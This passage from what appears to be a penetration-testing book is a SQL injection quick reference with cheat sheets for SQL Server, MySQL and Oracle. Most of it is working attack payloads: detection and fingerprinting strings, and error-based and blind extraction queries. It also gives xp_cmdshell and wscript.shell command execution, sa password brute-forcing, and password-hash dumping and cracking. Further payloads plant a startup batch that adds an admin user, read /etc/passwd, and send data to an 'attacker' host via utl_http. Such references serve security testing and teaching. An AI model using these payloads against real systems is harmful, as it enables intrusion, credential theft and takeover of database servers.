ORDER BY 1 ASC) \nRANDOMSTRING ORDER BY 1 DESC;  \nMySQL  Selecting the first row:  \nSELECT ∗ FROM tblUsers LIMIT 1,1  \nSelecting the fifth row:  \nSELECT ∗ FROM tblUsers LIMIT 5,1  \nOracle  Selecting the username  column from the first row in the tblUsers table:  \nSELECT username FROM (SELECT ROWNUM r, username FROM tblUsers ORDER BY 1) \nWHERE r=1;  \nPlatform  Query \nSELECT username FROM tblUsers WHERE rownum=1;  \nSelecting the username  column from the fifth row in the tblUsers ta ble: \nSELECT username FROM (SELECT ROWNUM r, username FROM tblUsers ORDER BY 1) \nWHERE r=5;  \nPostgreSQL  Selecting the username  column from the first row in the tblUsers table:  \nSELECT username FROM tblUsers ORDER BY username LIMIT 1 \nOFFSET 0;  \nSelecting th e username  column from the fifth row in the tblUsers table:  \nSELECT username FROM tblUsers ORDER BY username LIMIT 1 OFFSET 4;  \nFor other database platforms check your vendor documentation. \n \nSQL injection quick reference \nThis section provides a quick referenc e of some of the most common SQL queries and \ntechniques you will need when exploiting a SQL injection vulnerability. We’ll start by looking \nat some of the techniques employed to identify the database platform and then provide a SQL injection cheat sheet fo r each of the most common database platforms. You’ll find additional \ncheat sheets for less common platforms toward the end of this chapter, in “SQL Injection on Other Platforms.”  \nIdentifying SQL Injection Vulnerabilities  \nTable 11.4 covers the common techniques used when attempting to identify a SQL injection \nflaw. Any of the proposed methodologies can be used in isolation, however by combining multiple tests you can improve the accuracy of detection . \n \n \nTable 11.4  Discoveri ng SQL Injection Flaws  \nMethodology Descriptio n \nDoes malformed input \nyield a database \nerror?  Entering SQL metacharacters or a malformed/unexpected data type may result in a database error. Common test cases include a single- quote (‘) \ncharacter within a string field or random string within a numeric field.Errors can usually be recognized via a HTTP  status code of 500 \nand/or a descriptive error message within the page. Submitting malformed data and analyzing the server’s response for the following strings could help identify a SQL Injection vulnerability.  \nMicrosoft OLE DB Provider  \nORA- \nPLS- \nerror in your SQL Syntax  \n80040E14  \nSQL Error  \nIncorrect Syntax near  \nSQLServer  \nFailed MySQL  \nUnclosed Quotation Mark  \nJDBC Driver  \nODBC Driver  \nSQL \nODBC \n If errors are encountered, change the entered data to try to resolve the error and determine if the data you entered caused a SQL syntax violation. For example, double up single -quote characters —if one quote \nraises the error but two do not, it is likely th at you have uncovered an \nSQL injection flaw.Note that an error resulting from an unexpected data type can be expected and normal behavior. For example many \napplications will raise an error if string data is supplied where a numeric \nis expected. Further techniques should be adopted to confirm the existence of a SQL Injection vulnerability.  \nCan legitimate, expected input be substituted for an equivalent SQL \nexpression?  Before deploying this detection technique it is important to determine if \nthe input you are testing has an effect on the servers response. For example, if a numeric value is being supplied, try a different numeric value and determine if measureable and consistent difference occurs. For \nstring values, change the value to a random string using the same \ncharacter set and length and observe the applications response. If \nmodification to the data does not produce a consistent difference to the \nMethodology Descriptio n \npage length, content or HTTP response code, this technique is unlikely \nto succeed.  \nNumeric Data  \nFor this  example we will assume that we are testing a numeric ID \nparameter passed to the news.php script. The following two requests \nproduce different responses thereby confirming that the ID parameter is \ndynamic and can be used for this test methodology;  \nhttp://target/news.php?ID=1  \nhttp://target/news.php?ID=2  \nThe next step in this process is to submit a SQL expression that will \nevaluate to one of our confirmed good values (1 an d 2 in the above \nexample). The response to each expression can then be compared to our \ninitial test response to determine if the expression is being evaluated. A \ncommon SQL function to use in this type of testing is ASCII(), this \nfunction will return a int eger for a supplied ASCII character. Therefore, \nthe following SQL expression should return the value 1 (the ASCII code \nfor “2” is 50);  \n51-ASCII(2)  \nIf our input is being interpreted insecurely by the SQL Server, the \nfollowing requests should be equivalent t o our original requests:  \nhttp://target/news.php?ID=51- ASCII(2)--  equivalent to ID=1  \nhttp://target/news.php?ID=52- ASCII(2)--  equivalent to ID=2  \nThe “ASCII()”  function is supported by most mainstream platforms \nincluding; Microsoft SQL Server, Oracle, MySQL, and PostgreSQL.Try \nsimilar mathematical expressions to confirm your results.  \nString Data  When dealing with string data we adopt a similar approach \nto that used when assessing numeric parameters. As before, the first step \nis to obtain a valid value from the application and confirm that the \nservices response consistently differs when the value is changed. For the \npurpose of this example we assume that t he following request parameter \nvalues yield different results:  \nhttp://target/products.asp?catagory=shoes  \nhttp://target/products.asp?catagory=blahfoo  \nMethodology Descriptio n \nA common strategy when testing string data is to divide the string into \ntwo or more fragments and then use SQL syntax to concatenate the \nfragments server side. One important caveat to this approach is that we \nneed to customize our concatenation syntax depe nding on the database \nplatform. Since we may not know this ahead of time, a typical approach \nmight be to initially target common platforms such as Microsoft SQL \nServer, Oracle, and MySQL. The following URL’s implement \nconcatenation in an attempt to recreat e the parameter value “shoes”:  \nMicrosoft SQL Server  \nhttp://target/products.asp?catagory=sho’%2b’es  \n(%2b is a URL encoded +)  \nOracle / PostgreSQL  \nhttp://target/products.asp?catagory=sho’||’es  \nMySQL  \nhttp://target/products.asp?catagory=sho’%20’es  \n(%20 is a URL encoded space character)  \nChanging the value either side of the concaten ation operator should \ninvalidate the input and retrieve a result consistent with any other \nrandom string.  \nSee Table 11.6 for further concatenation operators. \nDoes the addition of a \nSQL conditional expression result in a consistent difference within the server’s response?  Statistically speaking, the majority of SQL injection flaws occur when user-supplied data is insecurely included within an operand passed to a \nWHERE clause. As an example, consider the following URL  and \nresulting SQL query:  \nURL: http://targetserver/news.php?id=100  \nSQL: SELECT ∗  FROM news WHERE article_id=100  \nUnder normal operation, the example above will retrieve and display the \nnews article that ha s an “article_id” value of 100. However, if the “id” \nparameter is vulnerable to SQL injection the following requests should \nprovide different results:  \nMethodology Descriptio n \nURL 1:  http://targetserver/news.php?id=100 and 1=1  \nURL 2:  http://targetserver/news.php?id=100and 1=2  \nBy adding “and 1=1” we should see no change within the page since \nlogically the expression does not change the outcome of the WHERE \nclause:  \nSELECT ∗ FROM news WHERE article_id=100 and 1=1  \nConversely, adding “and 1=2” will mean that the WHERE clause does \nnot match any record in the database:  \nSELECT ∗ FROM news WHERE article_id=100 and 1=2  \nBy manipulating the servers response using this technique we can often  \nidentify the presence of a SQL injection vulnerability. In some cases you \nmay need to close parenthesis or break out of quote -delimited data to use \nthis technique. For example, the following sequences could be used:  \n‘ AND ‘a’=’a Vs  ‘ AND ‘a’=’b  \n‘ AND 1=1- - Vs ‘ AND 1=2 -- \n) AND 1=1--  Vs ) AND 1=1 -- \n‘) AND 1=1 -- Vs ‘) AND 1=2--  \nIs it possible to trigger \na measurable time \ndelay?  Triggering a measurable time delay via SQL injection can be used to both confirm the existence of a flaw and in most cases fingerprint the back -end database. Functions used to generate time delays are covered \nin Table 1 1.5 within this chapter.  \nIdentifying the Database Platform  \nA common first task when exploiting a SQL injection flaw is to identify the back -end database \nplatform. In many cases, you may have already made an educated guess based on the \npresentation server platform and scripting language. For example, a Microsoft Internet \nInformation Server (IIS) server presenting an ASP.NET application is most likely integrated with Microsoft SQL Server; using the same principle, an Apache -hosted PHP application is \nmost like ly integrated with a MySQL Server. By grouping technologies together in this way, it \nis possible to approach a SQL injection flaw with a good idea of the database platform you are \nattacking. However, if your injected SQL doesn’t quite work out to plan, it may be necessary to identify the database platform using a more scientific approach.  \nIdentifying the Database Platform Via Time Delay Inference  \nGenerating a time delay based on server -specific functionality is a long -standing method of \nidentifying the database platform. Table 11.5 lists the functions or procedures for generating \nmeasurable time delays across th e most popular database platforms.  \nTable 11.5  Generating a Time Delay  \nPlatform  Time Dela y \nMicrosoft \nSQL Server  WAITFOR DELAY ‘0:0:10’  \nOracle  BEGIN DBMS_LOCK.SLEEP(5);END;-- (PL/SQL Injection only)  \nSELECT UTL_INADDR.get_host_name(‘192.168.0.1’) FROM dual  \nSELECT UTL_INADDR.get_host_address(‘foo.nowhere999.zom’) FROM dual  \nSELECT UTL_HTTP.REQUEST(‘http://www.oracle.com’) FROM dual  \nMySQL  BENCHMARK(1000000,MD5(“HACK”)) -- Prior to version 5.0.12  \nSLEEP(10); -- Version 5.0.12 and above  \nPostgreSQL  SELECT pg_sleep(10);-- Version 8.2 and over  \nCREATE OR REPLACE FUNCTION pg_sleep(int) RETURNS int AS ‘/lib/libc.so.6’, \n‘sleep’ language ‘C’ STRICT; --  create pg_sleep function on Linux. Requires \npostgres/pgsql level privileges  \nAnother similar approach involves submitting “heavy queries” designed to consume the \nprocessor for a measurable length of time. Since there are deviations within each vendor’s \nimplementation of SQL, it is possible to construct a heavy q uery that will execute successfully \non only one specific platform. Microsoft published an article on the subject in September 2007 that you can find at http://technet.microsoft.com/en -us/library/cc512676.aspx . \nIdentifying the Database Platform Via SQL Dialect Inference  \nThere are several deviations between each vend or’s SQL implementation that you could use to \nhelp identify the database server. A common method for narrowing down the list of potential \ndatabase platforms is to assess how the target server deals with platform -specific SQL syntax. \nTable 11.6 lists the common functions, comment character sequences, and default tables that \ncould be used to identify the database platform.  \nTable 11.6  SQL Dialect Deviations  \n \nFor example, if you suspect that the database platform is Microsoft SQL Server, MySQL, \nOracle, or PostgreSQ L you could inject the following statements to identify the database \nserver. In each case the injected statement will only succeed on its intended database platform and will raise an error on all others, each example is equivalent to the injection string; ’ AND 1=1--:Microsoft SQL Server  \n’ AND @@PACK_RECEIVED = @@PACK_RECEIVED --  \nMySQL  \n’AND CONNECTION_ID() = CONNECTION_ID() --  \nOracle’ AND BITAND(1,1) = BITAND(1,1) – \nPostgreSQL ’ AND getpgusername() = getpgusername()--  \nExtracting Data Via Error Messages  \n\nThe f ollowing examples will raise an error and include the database version string within the \nresulting error message. The initial “AND” within each example should be amended where \nnecessary, in some cases using “OR” in place of “AND” is required. Microsoft SQL  Server  \nAND 1 in ( SELECT @@version) -- \nAND 1=CONVERT(INT,(SELECT @@VERSION)) -- \nMySQL  \nAND (select 1 from (select count( ∗),concat((SELECT VERSION() ),floor(rand(0)∗ 2))x from \ninformation_schema.tables group by x)a)#  \nOracle  \nAND 1=(utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))) -- \nAND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE rownum=1 ))-- \nPostgreSQL  \nAND 1=CAST((SELECT version())::text AS NUMERIC) -- \nCombining Multiple Rows into a Single Row  \nWhen you are exploiting a S QL injection vulnerability you will often face the challenge that \nonly one column and one row can be returned at a time (e.g. when data is being returned via HTTP error messages). To bypass this restriction it is possible to concatenate all rows and columns into a single string. Table 11.7 provides examples of how you can achieve this across \nMicrosoft SQL Server, Oracle, and MySQL.  \nTable 11.7  SQL Combining Multiple Rows  \n \nMicrosoft SQL Server Cheat Sheet  \nMicrosoft SQL Server is one of the most common database platforms in use today. \nHistorically, Microsoft SQL Server has been one of the easier platforms to exploit via SQL \n\ninjection. This is mainly thanks to a host of powerful -extended stored procedures and verbose \nerror reporting on the Microsoft platform.  \nThis section provides a quick reference of common SQL statements used in SQL injection \nattacks against Microsoft SQL Server . \nEnumerating Database Configuration Information and Schema  \nTable 11.8 lists the SQL statements you can use to extract key configuration information. \nTable 11.9 lists the SQL statements used to enumerate Microsoft SQL Server schema \ninformation. \nTable 11.8  Extracting Microsoft SQL Server Configuration Information  \nData  Query \nVersion  SELECT @@version;  \nCurrent user  SELECT system_user;  \nSELECT suser_sname();  \nSELECT user;  \nSELECT loginame FROM master..sysprocesses WHERE \nspid =@@SPID;  \nList users  SELECT name FROM master..syslogins;  \nCurrent user privileges (returns 1 if the \nuser is sysadmin and 0 if the user does not have sysadmin privileges)  SELECT is_srvrolemember(‘sysadmin’);  \nDatabase server host name SELECT @@servername;  \nSELECT SERVERPROPERTY(‘productversion’), \nSERVERPROPERTY (‘productlevel’), SERVERPROPERTY \n(‘edition’);  \n-- SQL Server 2005 only  \nTable 11.9  Extracting the Microsoft SQL Server Schema  \n \n\n \n\n \n\n \nBlind SQL Injection Functions: Microsoft SQL Server  \nTable 11.10 lists functions that are useful when performing blind SQL injection attacks. \n\nTable 11.10  Blind SQL Injection Functions  \nData  Query \nString length  LEN()  \nExtract substring from a given string  SUBSTRING(string,offset,length)  \nString ( ‘ABC’ ) representation with no single \nquotes  SELECT char(0x41) + char(0x42) + char(0x43);  \nTrigger time delay  WAITFOR DELAY ‘0:0:9’;-- triggers 9 second time \ndelay  \nIF statement  IF (1=1) SELECT ‘A’ ELSE SELECT ‘B’ --  returns \n‘A’ \nMicrosoft SQL Server Privilege Escalation  \nThis section covers some of the generic privilege escalation attacks that can be performed \nagainst the Microsoft SQL Server platform. Over the years, a number of vulnerabilities have been discovered and publicly disclosed that could be used to elevate privileges. However, since Microsoft regularly patches vulnerabilities within the database platform, any list produced here would be out of date by the time this book is published. To learn more about the most recent vulnerabilities affecting the Microsoft SQL  Server platform, search a popular \nvulnerability database such as www.secunia.com  or www.securityfocus.com . Table 11.11 \nmaps the version number stored within the @@version  variable to an actual release and \nservice pack number. See the following Microsoft Knowledge based article for further details: http://support.microsoft.com/kb/937137/en- us. \nTable 11.11  Microsoft SQL Server Version Numbers  \nVersion Number  Service Pack  \nVersion Number  Service Pack  \n9.00.3042 Microsoft SQL Server 2005 SP2  \n9.00.2047 Microsoft SQL Server 2005 SP1  \n9.00.1399 Microsoft SQL Server 2005 \n8.00.2039 Microsoft SQL Server 2000 SP4  \n8.00.818 Microsoft SQL Server 2000 SP3 w/ Cumulative Patch MS03- 031 \n8.00.760 Microsoft SQL Server 2000 SP3  \n8.00.532 Microsoft SQL Server 2000 SP2  \n8.00.384 Microsoft SQL Server 2000 SP1  \n8.00.194 Microsoft SQL Server 2000 \n7.00.1063 Microsoft SQL Server 7.0 SP4  \n7.00.961 Microsoft SQL Server 7.0 SP3  \n7.00.842 Microsoft SQL Server 7.0 SP2  \n7.00.699 Microsoft SQL Server 7.0 SP1  \nVersion Number  Service Pack  \n7.00.623 Microsoft SQL Server 7.0  \n6.50.479 Microsoft SQL Server 6.5 SP5a Update  \n6.50.416 Microsoft SQL Server 6.5 SP5a  \n6.50.415 Microsoft SQL Server 6.5 SP5  \n6.50.281 Microsoft SQL Server 6.5 SP4  \n6.50.258 Microsoft SQL Server 6.5 SP3  \n6.50.240 Microsoft SQL Server 6.5 SP2  \n6.50.213 Microsoft SQL Server 6.5 SP1  \n6.50.201 Microsoft SQL Server 6.5 RTM  \nOPENROWSET Reauthentication Attack  \nMany Microsoft SQL applications that I have encountered are configured to use an \napplication -specific user account with limited privileges. However, the same applications are \noften integrating with a SQL Server that has a weak sa  (system administrator) acc ount \npassword. The following OPENROWSET  query will attempt to connect to SQL Server with \naddress 127.0.0.1 using the sa  account with a password of letmein : \nSELECT ∗ FROM OPENROWSET(‘ SQLOLEDB’ ,‘127.0.0.1’ ;‘sa’;‘letmein’ ,‘SET FMTONLY OFF execute \nmaster..xp_cmdshell “dir”’)--  \nA scripted injection attack that switches out the password value for common dictionary \nwords could be used to launch an attack against the local sa  account. Furthermore, the SQL \nServer Internet Protocol (IP) address parameter could be used to iterate through the local \nnetwork IP range in search of SQL Servers with a weak sa  password.  \nTip \nThe Burp Intruder feature of the Burp Suite from www.portswigger.net  is ideal for performing this type of attack. \nTo launch a dictionary attack against the sa user account use the sniper attack type along with a Preset List \npayload set (containing a list of common passwords). To launch an attack for local SQL Servers use the numbers \npayload set to iterate through the local IP range.  \nBy default, the OPENROWSET  function is disabled on SQL Server 2005. This can be \nreenabled if the application user is the database owner (DBO) for t he master database:  \nEXEC sp_configure ‘show advanced options’, 1  \nEXEC sp_configure reconfigure  \nEXEC sp_configure ‘Ad Hoc Distributed Queries’, 1  \nEXEC sp_configure reconfigure  \nAttacking the Database Server: Microsoft SQL Server  \nThis section details attacks against the database server host such as code execution and local file access. All of the attacks detailed here assume that you are attacking the database server over the Internet via a SQL injection vulnerability.  \nSystem Comma nd Execution Via xp_cmdshell  \nMicrosoft SQL Server 7, 2000, and 2005 include an extended stored procedure named xp_cmdshell  that can be called to execute operating system commands. When attacking SQL \nServer versions 2000 and earlier, the following SQL state ment can be executed by the DBO of \nthe master database (e.g. the sa  user):  \nEXEC master.dbo.xp_cmdshell ‘os command’  \nFor SQL Server version 2005, the xp_cmdshell  stored procedure is disabled by default and \nmust first be reenabled using the following SQL:  \nEXEC sp_configure ‘show advanced options’, 1  \nEXEC sp_configure reconfigure  \nEXEC sp_configure ‘xp_cmdshell’, 1  \nEXEC sp_configure reconfigure  \nIf the xp_cmdshell  stored procedure has been dropped but the .dll has not been deleted, the \nfollowing will reenable it : \nEXEC sp_addextendedproc ‘xp_cmdshell’, ‘xpsql70.dll’  \nEXEC sp_addextendedproc ‘xp_cmdshell’, ‘xplog70.dll’  \nxp_cmdshell Alternative  \nAs an alternative to the xp_cmdshell  stored procedure, you can execute the following SQL \nstatements to achieve the same effect:  \nDECLARE @altshell INT  \nEXEC SP_OACREATE ‘wscript.shell’,@altshell OUTPUT  \nEXEC SP_OAMETHOD @altshell,‘run’,null, ‘%systemroot%\\ system32\\ cmd.exe /c’  \nTo execute this alternative shell on Microsoft SQL Server 2005 you will first need to \nexecute the followin g SQL:  \nEXEC sp_configure ‘show advanced options’, 1  \nEXEC sp_configure reconfigure  \nEXEC sp_configure ‘Ole Automation Procedures’, 1  \nEXEC sp_configure reconfigure  \nCracking Database Passwords  \nMicrosoft SQL Server 2000 password hashes are stored within the sys xlogins  table and you \ncan extract them using the following SQL statement: \nSELECT user,password FROM master.dbo.sysxlogins  \nThe result of the preceding query looks something like the following:  \nsa, 0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE91C0784B911D76  \nBF4EB124550ACABDFD1457  \nThe long string beginning with 0x0100 can be dissected as follows. The first four bytes \nfollowing the 0x  are constant; the next eight bytes are the hash salt —in this example, the salt \nvalue is 236A261C . The remaining 80 bytes are actually two hashes; the first 40  bytes are a \ncase- sensitive hash of the password, and the second 40 bytes are an uppercased versio n. \nHere is the case -sensitive hash:  \nE12AB57BA22A7F44CE3B780E52098378B6585289  \nAnd here is the case -insensitive hash:  \n2EEE91C0784B911D76BF4EB124550ACABDFD1457  \nThe salt and either (or both) password hashes can be loaded into Cain & Abel ( www.oxid.it ) \nto launch a dictionary or brute force attack against the password.  \nMicrosoft SQL Server 2005 Hashes  \nMicrosoft SQL Server 2005 does not store a case -insensitive version of the password hash; \nhowever, the mixed -case version is stil l accessible. The following SQL statement will retrieve \nthe password hash for the sa  account:  \nSELECT password_hash FROM sys.sql_logins WHERE name=‘sa’  \nSELECT name + ‘- ’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins  \nThe following example hash value includes a four -byte constant ( 0x0100), an eight -byte salt \n(4086CEB6), and a 40 -byte mixed -case hash (beginning with D8277):  \n0x01004086CEB6D8277477B39B7130D923F399C6FD3C6BD46A0365  \nFile Read/Write  \nIt is possible to read local files provid ing you have INSERT  and ADMINISTER BULK \nOPERATIONS  permissions. The following SQL will read the local file c: \\boot.ini into the \nlocalfile  table:  \nCREATE TABLE localfile(data varchar(8000));  \nBULK INSERT localfile FROM ‘c: \\boot.ini’;  \nYou can then extract data  back out from the localfile  table using a SELECT  statement. If you \nare extracting table data out via error messages, you may be limited to one row per query. In \nthis case, you may need a point of reference to select each row one by one. You can use the ALTER TABLE statement to add an auto -incrementing IDENTITY  column to the localfile  table. \nThe following SQL statement will add an IDENTITY  column named id  with an initial value of \n1, incrementing with each row in the table:  \nALTER TABLE localfile ADD id INT I DENTITY(1,1);  \nData can now be extracted by referencing the id  column. For example:  \nSELECT data FROM localfile WHERE id = 1;  \nSELECT data FROM localfile WHERE id = 2;  \nSELECT data FROM localfile WHERE id = 3;  \nMySQL Cheat Sheet  \nMySQL is a popular open source database platform commonly implemented alongside PHP and Ruby on Rails applications. This section provides a quick reference of common SQL statements used in SQL injection attacks against MySQL Server.  \nEnumerating Database Configuration Information and Schema  \nTable 11.12  lists SQL statements used to extract key configuration information. Table 11.13  \nlists the SQL statements used to enumerate schema information from MySQL 5.0 and later.  \nTable 11.12  Extracting MySQL Server Configuration Information  \nData  Query \nData  Query \nVersion  SELECT @@version  \nCurrent user  SELECT user();  \nSELECT system_user();  \nList users  SELECT user FROM mysql.user;  \nCurrent user \nprivileges  SELECT grantee, privilege_type, is_grantable FROM \ninformation_schema.user_privileges;  \nTable 11.13  Extracting Schema Information from MySQL 5.0 and Later  \nData  Query \nCurrent database  SELECT database()  \nList databases  SELECT schema_name FROM information_schema.schemata;  \nList tables  List tables within the current database:  \nSELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = database()  \nList all tables for all user -defined databases:  \nSELECT table_schema,table_name FROM information_schema.tables WHERE table_schema \n!= ‘information_schema’ AND table_schema != ‘mysql’  \nList \ncolumns  List columns within a specific table:  \nSELECT column_name FROM information_schema.columns WHERE table_name =‘tblUsers’# \nData  Query \nreturns columns from tblUsers  \nList all columns for all user -defined tables:  \nSELECT table_schema, table_name, column_name FROM information_schema.columns \nWHERE table_schema != ‘information_schema’ AND table_schema !=‘mysql’  \nBlind SQL Injection Functions: MySQL  \nTable 11.14 lists functions that are useful when performing blind SQL injection attacks. \nTable 11.14  Blind SQL Injection Functions  \nData  Query \nString length  LENGTH()  \nExtract substring from a given string  SELECT SUBSTR(string, offset, length);  \nString ( ‘ABC’ ) representation with no \nsingle quotes  SELECT char(65,66,67);  \nTrigger time delay  BENCHMARK(1000000,MD5(“HACK”));  \n# Triggers a measurable time delay  \nSLEEP(10);  \n# Triggers a 10- second time delay (MySQL Version 5 \nand later)  \nIF statement  SELECT if(1=1,‘A’,‘B’);  \n-- returns ‘A’  \nAttacking the Database Server: MySQL  \nUnlike Microsoft SQL S erver, MySQL does not contain any built -in procedures for executing \noperating system commands. There are, however, a number of strategies that could lead to \nremote system access. This section describes some of the strategies that could be employed to \ngain remote code execution and/or read and write local files.  \nSystem Command Execution \nIt is possible to execute operating system commands by creating a malicious script file on the target server that will be routinely executed. The following syntax is used to write local files from within MySQL:  \nSELECT ‘system_commands’ INTO dumpfile trojanpath  \nThe following statement would create a batch file within the Windows startup directory \ndesigned to add administrative user x with a password of x : \nSELECT ‘net user x x /add%26%26 net localgroup administrators x /add’ into  \ndumpfile ‘c:\\ \\Documents and Settings\\ \\All Users \\\\Start Menu\\ \\Programs  \n\\\\Startup\\ \\attack.bat’  \nTools & traps… \nPlanting Trojans Via UNION SELECT  \nWhen using UNION SELECT to create your Trojan script, you must write to your target file all the data the \noriginal SQL query selects before your indented system commands. This could be problematic since the data \nselected by the original query may stop the Trojan from executing correctly.  \nTo overcome this, ensure that the query you are injecting into does not return any data of its own. Appending \nAND 1=0 should do the trick.  \nCracking Database Passwords  \nYou can extract user password hashes from the mysql.user  table as long as your current user \naccount has the required privileges (by default, the root user account has sufficient privileges). To return a colon- separated list of usernames and password hashes execute the following \nstatement: \nSELECT concat(user,“:”,password) FROM mysql.user  \nPassword hashes can then be cracked using Cain & Abel or John the Ripper \n(www.openwall.com/john/ ). \nAttacking the Database Directly  \nYou can execute code by directly connecting to the M ySQL Server and creating a user -defined \nfunction. You can download a tool to perform this attack from the following Web sites:  \n• Windows: www.scoobygang.org/HiDDenWarez/mexec.pl  \n• Windows: www.0xdeadbeef.info/exploits/raptor_winudf.tgz  \n• UNIX -based: www.0xdeadbeef.info/exploits/raptor_udf.c  \nFile Read  \nThe MySQL LO AD_FILE  function returns a string containing the contents of a specified file. \nThe database user requires the file_priv  privilege to invoke this function. To view the \n/etc/passwd file on UNIX hosts the following syntax could be used:  \nSELECT LOAD_FILE(‘/etc/passwd’);  \nIf MAGIC_QUOTES_GPC  is enabled, you can represent the file path using a hexadecimal \nstring to avoid using single -quote characters:  \nSELECT LOAD_FILE(0x2f6574632f706173737764);# Loads /etc/passwd  \nYou can use a tool called SqlDumper written by Anto nio “s4tan” Parata to read file contents \nvia blind SQL injection. SqlDumper is available for download at \nwww.ictsc.it/site/IT/projects/sqlDumper/sqlDumper.php . \nFile Write  \nThe MySQL “INTO dumpfile” directive can be added to any SELECT statement to direct the \nresulting records to an external file (permissions permitting). This feature could be abused by a malicious attacker to create a backdoor script with a Web accessible di rector or a Trojan script \nthat will be routinely executed. The following query will SELECT all data from ‘mytable’ and write its output to /tmp/hacker:  \nSELECT ∗ FROM mytable INTO dumpfile ‘ /tmp/hacker ’; \nOracle Cheat Sheet  \nThe Oracle database is typically i mplemented for large -scale applications where database \nperformance or high availability is a key requirement.  \nEnumerating Database Configuration Information and Schema  \nTable 11.15 lists SQL statements used to extract k ey configuration information. Tables 11.16 \nand 11.17 list the SQL statements used to enumerate Oracle schema information.  \nTable 11.15  Extracting Oracle Server Configuration Informa tion \nData  Query \nVersion  SELECT banner FROM v$version;  \nCurrent user  SELECT user FROM dual;  \nList users  SELECT username FROM all_users ORDER BY username;  \nCurrent user \nprivileges  SELECT ∗ FROM user_role_privs;  \nSELECT ∗ FROM user_tab_privs;  \nSELECT ∗ FROM user_sys_privs;  \nSELECT sys_context(‘USERENV’, ‘ISDBA’) FROM dual;  \nSELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY \nDICTIONARY’;  \nAppServer host \nname  SELECT sys_context(‘USERENV’, ‘HOST’) FROM dual;  \nSELECT sys_context(‘USERENV’, ‘SERVER_HOST’) FROM dual;  \nDatabase server \nhost name  SELECT UTL_INADDR.get_host_name FROM dual  \nEstablish \nexternal SELECT utl_http.request(‘http://attacker:1000/’||(SELECT banner FROM \nv$version WHERE rownum=1)) FROM dual  \nEstablishes an HTTP connection over port 1000 to the host; attacker , the \nData  Query \nconnections  HTTP request, contains the Oracle version banner within the request path.  \nRaise an error  Raise an error containing the  version banner  \nAND (utl_inaddr.get_host_name((select banner from v$version where \nrownum=1)))=1  \nTable 11.16  Extracting Oracle Database Schema  \nData  Query \nDatabase name  SELECT global_name FROM global_name;  \nList schema/users  SELECT username FROM all_users;  \nList table names and their \nschema  SELECT owner,table_name FROM all_tables;  \nList columns  SELECT owner, table_name, column_name FROM all_tab_columns WHERE \ntable_name = ‘tblUsers’;  \nTable 11.17  Encryption in the Database  \nData  Query \nEncrypted tables  SELECT table_name, column_name, encryption_alg, salt FROM \ndba_encrypted_columns;  \nSince Oracle 10g, you can use transparent encryption for tables. For \nperformance reasons, only the most important columns are usually \nencrypted.  \nData  Query \nList objects \nusing crypto libraries  SELECT owner, name, type, referenced_name FROM all_dependencies;  \n--show objects using database encryption (e.g. for passwords in \n‘DBMS_CRYPTO’and ‘DBMS_OBFUSCATION_TOOLKIT’)  \nList PL/SQL \nfunctions containing the string ‘crypt’  SELECT owner,object_name,procedure_name FROM all_procedures where \n(lower(object_name) LIKE ‘%crypt%’ or lower(procedure_name) like \n‘%crypt%’) AND object_name not in \n(‘DBMS_OBFUSCATION_TOOLKIT’,‘DBMS_CRYPTO_TOOLKIT’)  \nBlind SQL Injection Functions: Oracle  \nTable 11.18 lists functions that are useful when performing  blind SQL injection attacks.  \nTable 11.18  Blind SQL Injection Functions  \nData  Query \nString length  LENGTH()  \nExtract substring \nfrom a given string  SELECT SUBSTR(string, offset, length) FROM dual;  \nString ( ‘ABC’ ) \nrepresentation with no single quotes  SELECT chr(65) || chr(66) || chr(67) FROM dual;  \nSELECT concat(chr(65),concat(chr(66),chr(67))) FROM dual;  \nSELECT upper((select \nsubstr(banner,3,1)||substr(banner,12,1)||substr(banner,4,1) from \nv$version where rownum=1 )) FROM dual;  \nTrigger time delay  SELECT UTL_INADDR.get_host_address(‘nowhere999.zom’)  \nFROM dual;  \n-- triggers measurable time delay  \nAttacking the Database Server: Oracle  \nIn Oracle, there are two different types of injection: traditional SQL injection and PL/SQL \ninjection. In PL/SQL injection you can execute entire PL/SQL blocks, and in traditional SQL injection it is typically possible to modify only a single SQL statement. \nCommand Execution  \nYou can use the following scripts, written by Marco Ivaldi, to achieve system command execution and local file read/write access:  \n• www.0xdeadbeef.info/exploits/rapt or_oraexec.sql  \n• www.0xdeadbeef.info/exploits/raptor_oraextproc.sql  \nReading Local Files  \nHere are some PL/SQL code examples for reading local files from the Oracle server:  \nReading local files: XMLType  \ncreate or replace directory GETPWDIR as ‘C:\\ APP\\ROOT\\PRODUCT\\ 11.1.0\\DB_1\\OWB\\J2EE\\CONFIG’;  \nselect extractvalue(value(c), ‘/connection -factory/@user’)||‘/’||extractvalue(value(c), \n‘/connection- factory/@password’)||‘@’||substr(ex tractvalue(value(c), ‘/connection-\nfactory/@url’),instr(extractvalue(value(c), ‘/connection- factory/@url’),‘//’)+2) conn  \nFROM table(  \n XMLSequence(  \n  extract(  \n   xmltype(  \n     bfilename(‘GETPWDIR’, ‘data -sources.xml’),  \n    nls_charset_id(‘WE8ISO8859P1’)  \n   ), \n   ‘/data-sources/connection- pool/connection -factory’  \n  ) \n ) \n) c \n/ \nReading Local Files: Oracle Text  \nCREATE TABLE files (id NUMBER PRIMARY KEY,path VARCHAR(255) UNIQUE,ot_format VARCHAR(6));  \nINSERT INTO files VALUES (1, ‘c:\\ boot.ini’, NULL); --insert the columns to be read into the \ntable (e.g. via SQL Injection)  \nCREATE INDEX file_index ON files(path) INDEXTYPE IS ctxsys.context PARAMETERS (‘datastore \nctxsys.file_datastore format column ot_format’);  \n-- retrieve data (boot.ini) from the fulltext index  \nSELECT token_text from dr$file_index$i;  \nReading Local Files (PL/SQL Injection Only)  \nThe following examples will work only when performing a PL/SQL injection attack. In the \nvast majority of cases, yo u will need to connect to the database directly to execute PL/SQL \nblocks. \nReading local files: dbms_lob  \nCreate or replace directory ext AS ‘C: \\’; \nDECLARE  \n  buf varchar2(4096);  \nBEGIN  \n  Lob_loc:= BFILENAME(‘MEDIA_DIR’, ‘aht.txt’);  \n  DBMS_LOB.OPEN (Lob_loc, DBMS_LOB.LOB_READONLY);  \n  DBMS_LOB.READ (Lob_loc, 1000, 1, buf);  \n  dbms_output.put_line(utl_raw.cast_to_varchar2(buf));  \n  DBMS_LOB.CLOSE (Lob_loc);  \nEND; 